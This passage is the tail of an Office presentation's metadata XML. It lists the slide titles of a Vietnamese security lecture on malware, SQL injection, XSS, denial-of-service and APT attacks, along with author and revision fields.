      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền lây nhiễm nội dung – Virus</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền lây nhiễm nội dung – Virus</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền lây nhiễm nội dung – Virus </vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền lây nhiễm nội dung – Virus </vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền lây nhiễm nội dung – Virus</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền khai thác lỗ hổng – Worm</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Cơ chế lan truyền kỹ nghệ xã hội - Spam email, Trojan</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Hành vi – Phá vỡ hệ thống</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Hành vi – Agent tấn công – Zoombie, bots</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Hành vi - Đánh cắp thông tin – Keylogger, Phishing, Spyware</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Hành vi ẩn giấu – Backdoor, rootkit</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Hành vi ẩn giấu – Backdoor, rootkit</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Hành vi ẩn giấu – Backdoor, rootkit</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Hành vi ẩn giấu – Backdoor, rootkit</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Hành vi ẩn giấu – Backdoor, rootkit</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Biện pháp đối phó</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Biện pháp đối phó</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Biện pháp đối phó</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Biện pháp đối phó</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Biện pháp đối phó</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Biện pháp đối phó</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Biện pháp đối phó</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Biện pháp đối phó</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Biện pháp đối phó</vt:lpstr>
      <vt:lpstr>III. MÃ ĐỘC Biện pháp đối phó</vt:lpstr>
      <vt:lpstr>NỘI DUNG</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG </vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG 1. Nguy cơ tấn công do thám</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG 1. Nguy cơ tấn công do thám</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG 1. Nguy cơ tấn công do thám</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG 1. Nguy cơ tấn công do thám</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG 1. Nguy cơ tấn công do thám</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG 1. Nguy cơ tấn công do thám</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG </vt:lpstr>
      <vt:lpstr>Nội dung chính</vt:lpstr>
      <vt:lpstr>Khái niệm</vt:lpstr>
      <vt:lpstr>Khái niệm</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các dạng tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các biện pháp phòng chống tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các biện pháp phòng chống tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các biện pháp phòng chống tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các biện pháp phòng chống tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Các biện pháp phòng chống tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Một số công cụ tấn công SQL Injection</vt:lpstr>
      <vt:lpstr>Một số công cụ quét lỗ hổng SQL Injection</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG </vt:lpstr>
      <vt:lpstr>Giới thiệu về XSS</vt:lpstr>
      <vt:lpstr>Giới thiệu về XSS</vt:lpstr>
      <vt:lpstr>Giới thiệu về XSS</vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Mức độ nguy hiểm của XSS </vt:lpstr>
      <vt:lpstr>Mục đích mà XSS hướng tới </vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Các hình thức tồn tại của XSS</vt:lpstr>
      <vt:lpstr>Hoạt động của XSS </vt:lpstr>
      <vt:lpstr>Hoạt động của XSS </vt:lpstr>
      <vt:lpstr>Kiểm tra lỗi XSS</vt:lpstr>
      <vt:lpstr>Kiểm tra lỗi XSS</vt:lpstr>
      <vt:lpstr>Kiểm tra lỗi XSS</vt:lpstr>
      <vt:lpstr>Khai thác lỗi XSS</vt:lpstr>
      <vt:lpstr>Khai thác lỗi XSS </vt:lpstr>
      <vt:lpstr>Khai thác lỗi XSS</vt:lpstr>
      <vt:lpstr>Khai thác lỗi XSS</vt:lpstr>
      <vt:lpstr>Khai thác lỗi XSS</vt:lpstr>
      <vt:lpstr>Khai thác lỗi XSS</vt:lpstr>
      <vt:lpstr> Phòng chống XSS </vt:lpstr>
      <vt:lpstr> Phòng chống XSS</vt:lpstr>
      <vt:lpstr> Phòng chống XSS</vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG </vt:lpstr>
      <vt:lpstr>IV. NGUY CƠ TẤN CÔNG </vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ  </vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công DoS cổ điển</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công DoS cổ điển</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công DoS cổ điển</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công DoS cổ điển</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công DoS cổ điển</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công DoS cổ điển</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công DoS cổ điển</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công tràn ngập (Flooding attack) </vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công tràn ngập (Flooding attack) </vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công tràn ngập (Flooding attack) </vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công DoS gián tiếp</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ  Tấn công DDoS</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ  Tấn công DDoS</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ  Tấn công băng thông dựa trên ứng dụng</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ  Tấn công băng thông dựa trên ứng dụng</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ  Tấn công băng thông dựa trên ứng dụng </vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ  Tấn công băng thông dựa trên ứng dụng </vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công phản xạ</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công phản xạ</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công phản xạ</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công khuếch đại</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Tấn công khuếch đại</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Phòng thủ chống lại cuộc tấn công DDoS</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Phòng thủ chống lại cuộc tấn công DDoS</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Phòng thủ chống lại cuộc tấn công DDoS</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Phòng thủ chống lại cuộc tấn công DDoS</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Phòng thủ chống lại cuộc tấn công DDoS</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ Phòng thủ chống lại cuộc tấn công DDoS</vt:lpstr>
      <vt:lpstr>5. Nguy cơ tấn công từ chối dịch vụ </vt:lpstr>
      <vt:lpstr>TẤN CÔNG APT (Advanced Persistent Threats)</vt:lpstr>
      <vt:lpstr>TẤN CÔNG APT (Advanced Persistent Threats)</vt:lpstr>
      <vt:lpstr>TẤN CÔNG APT (Advanced Persistent Threats)</vt:lpstr>
      <vt:lpstr>TẤN CÔNG APT (Advanced Persistent Threats) </vt:lpstr>
    </vt:vector>
  </TitlesOfParts>
  <Company>309-A12</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creator>Van Vu</dc:creator>
  <cp:lastModifiedBy>YEN TRAN</cp:lastModifiedBy>
  <cp:revision>1466</cp:revision>
  <cp:lastPrinted>2016-06-15T15:35:47Z</cp:lastPrinted>
  <dcterms:created xsi:type="dcterms:W3CDTF">2009-10-12T15:30:40Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2018-08-30T08:48:07Z</dcterms:modified>
</cp:coreProperties>
</file>